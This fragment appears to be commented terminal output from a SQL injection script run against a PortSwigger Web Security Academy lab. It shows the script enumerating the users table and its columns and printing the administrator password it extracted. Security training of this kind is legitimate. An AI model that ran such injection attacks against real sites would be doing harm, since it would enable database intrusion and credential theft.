...
#└─$ python3 sqlilab9.py "https://0aee00fa0331ec2a82dd925500a60051.web-security-academy.net"
#Looking for a users table...
#Found the users table name: users_vnqmnw
#password_niljtc
#Found the username column name: username_vqoefq
#Found the password column name: password_niljtc
#hi
#[+] The administrator password is: ttwieehrrwud71grb24j
